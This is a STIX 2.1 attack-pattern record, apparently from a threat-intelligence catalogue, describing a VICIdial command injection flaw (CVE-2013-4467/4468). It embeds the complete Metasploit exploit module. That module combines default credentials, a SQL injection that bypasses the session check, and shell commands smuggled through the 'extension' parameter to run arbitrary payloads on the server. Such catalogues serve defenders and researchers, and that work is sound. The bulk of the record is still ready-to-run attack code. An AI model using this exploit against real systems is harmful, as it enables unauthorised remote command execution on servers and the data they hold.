{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9046bfc8-110e-4788-a2e9-af1b30f12144",
    "created": "2024-08-14T17:13:26.527923Z",
    "modified": "2024-08-14T17:13:26.527927Z",
    "name": "VICIdial Manager Send OS Command Injection",
    "description": " The file agc/manager_send.php in the VICIdial web application uses unsanitized user input as part of a command that is executed using the PHP passthru() function. A valid username, password and session are needed to access the injection point. Fortunately, VICIdial has two built-in accounts with default passwords and the manager_send.php file has a SQL injection vulnerability that can be used to bypass the session check as long as at least one session has been created at some point in time. In case there isn't any valid session, the user can provide astGUIcient credentials in order to create one. The results of the injected commands are returned as part of the response from the web server. Affected versions include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/vicidial_manager_send_cmd_exec.rb",
            "external_id": "vicidial_manager_send_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4467"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4468"
        },
        {
            "source_name": "reference",
            "url": "http://www.openwall.com/lists/oss-security/2013/10/23/10"
        },
        {
            "source_name": "reference",
            "url": "http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'VICIdial Manager Send OS Command Injection',\n      'Description' => %q{\n          The file agc/manager_send.php in the VICIdial web application uses\n        unsanitized user input as part of a command that is executed using the PHP\n        passthru() function. A valid username, password and session are needed to access\n        the injection point. Fortunately, VICIdial has two built-in accounts with default\n        passwords and the manager_send.php file has a SQL injection vulnerability that can\n        be used to bypass the session check as long as at least one session has been\n        created at some point in time. In case there isn't any valid session, the user can\n        provide astGUIcient credentials in order to create one. The results of the injected\n        commands are returned as part of the response from the web server. Affected versions\n        include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The\n        default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit.\n      },\n      'Author'      =>\n        [\n          'Adam Caudill <adam[at]adamcaudill.com>', # Vulnerability discovery\n          'AverageSecurityGuy <stephen[at]averagesecurityguy.info>', # Metasploit Module\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-4467' ],\n          [ 'CVE', '2013-4468' ],\n          [ 'OSVDB', '98903' ],\n          [ 'OSVDB', '98902' ],\n          [ 'BID', '63340' ],\n          [ 'BID', '63288' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2013/10/23/10' ],\n          [ 'URL', 'http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/' ]\n        ],\n      'DisclosureDate' => '2013-10-23',\n      'Privileged'     => true,\n      'Platform'       => ['unix'],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 8000, # Apache's limit for GET, it should be enough one to fit any payload\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              # Based on vicibox availability of binaries\n              'RequiredCmd' => 'generic perl python awk telnet nc openssl',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'CMD',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('USERNAME',              [true, 'VICIdial Username', 'VDCL']),\n        OptString.new('PASSWORD',              [true, 'VICIdial Password', 'donotedit']),\n        OptString.new('USER_ASTGUI',           [false, 'astGUIcient User Login', '6666']),\n        OptString.new('PASS_ASTGUI',           [false, 'astGUIcient User Password', '1234']),\n        OptString.new('PHONE_USER_ASTGUI',     [false, 'astGUIcient Phone Login', '6666']),\n        OptString.new('PHONE_PASSWORD_ASTGUI', [false, 'astGUIcient Phone Password', '1234'])\n      ])\n  end\n\n  # Login through astGUIclient and create a web_client_sessions if there isn't\n  # something available\n  def login\n    begin\n      res = send_request_cgi({\n        'uri'       => '/agc/astguiclient.php',\n        'method'    => 'POST',\n        'vars_post' => {\n         \"user\"        => datastore[\"USER_ASTGUI\"],\n         \"pass\"        => datastore[\"PASS_ASTGUI\"],\n         \"phone_login\" => datastore[\"PHONE_USER_ASTGUI\"],\n         \"phone_pass\"  => datastore[\"PHONE_PASSWORD_ASTGUI\"]\n        }\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n\n    return res\n  end\n\n  def astguiclient_creds?\n    if datastore[\"USER_ASTGUI\"].nil? or datastore[\"USER_ASTGUI\"].empty?\n      return false\n    end\n\n    if datastore[\"PASS_ASTGUI\"].nil? or datastore[\"PASS_ASTGUI\"].empty?\n      return false\n    end\n\n    if datastore[\"PHONE_USER_ASTGUI\"].nil? or datastore[\"PHONE_USER_ASTGUI\"].empty?\n      return false\n    end\n\n    if datastore[\"PHONE_PASSWORD_ASTGUI\"].nil? or datastore[\"PHONE_PASSWORD_ASTGUI\"].empty?\n      return false\n    end\n\n    return true\n  end\n\n  def request(cmd, timeout = 20)\n    begin\n      res = send_request_cgi({\n        'uri'      => '/agc/manager_send.php',\n        'method'   => 'GET',\n        'vars_get' => {\n          \"enable_sipsak_messages\" => \"1\",\n          \"allow_sipsak_messages\"  => \"1\",\n          \"protocol\"               => \"sip\",\n          \"ACTION\"                 => \"OriginateVDRelogin\",\n          \"session_name\"           => rand_text_alpha(12), # Random session name\n          \"server_ip\"              => \"' OR '1' = '1\", # SQL Injection to validate the session\n          \"extension\"              => \";#{cmd};\",\n          \"user\"                   => datastore['USERNAME'],\n          \"pass\"                   => datastore['PASSWORD']\n        }\n      }, timeout)\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n\n    return res\n  end\n\n  def check\n    res = request('ls -a .')\n\n    if res and res.code == 200\n      if res.body =~ /Invalid Username\\/Password/\n        vprint_error(\"Invalid Username or Password.\")\n        return Exploit::CheckCode::Detected\n      elsif res.body =~ /Invalid session_name/\n        vprint_error(\"Web client session not found\")\n        return Exploit::CheckCode::Detected\n      elsif res.body =~ /\\.\\n\\.\\.\\n/m\n        return Exploit::CheckCode::Vulnerable\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Checking if injection is possible...\")\n    res = request('ls -a .')\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unknown response, check the target\")\n    end\n\n    if res.body =~ /Invalid Username\\/Password/\n      fail_with(Failure::NoAccess, \"#{peer} - Invalid VICIdial credentials, check USERNAME and PASSWORD\")\n    end\n\n    if res.body =~ /Invalid session_name/\n      fail_with(Failure::NoAccess, \"#{peer} - Valid web client session not found, provide astGUI or wait until someone logins\") unless astguiclient_creds?\n      print_error(\"Valid web client session not found, trying to create one...\")\n      res = login\n      unless res and res.code == 200 and res.body =~ /you are logged/\n        fail_with(Failure::NoAccess, \"#{peer} - Invalid astGUIcient credentials, check astGUI credentials or wait until someone login.\")\n      end\n      res = request('ls -a .')\n    end\n\n    unless res and res.code == 200 and res.body =~ /\\.\\n\\.\\.\\n/m\n      fail_with(Failure::NotVulnerable, \"#{peer} - Injection hasn't been possible\")\n    end\n\n    print_good(\"Exploitation looks feasible, proceeding... \")\n    request(\"#{payload.encoded}\", 1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-23",
    "x_mitre_platforms": [
        "unix"
    ]
}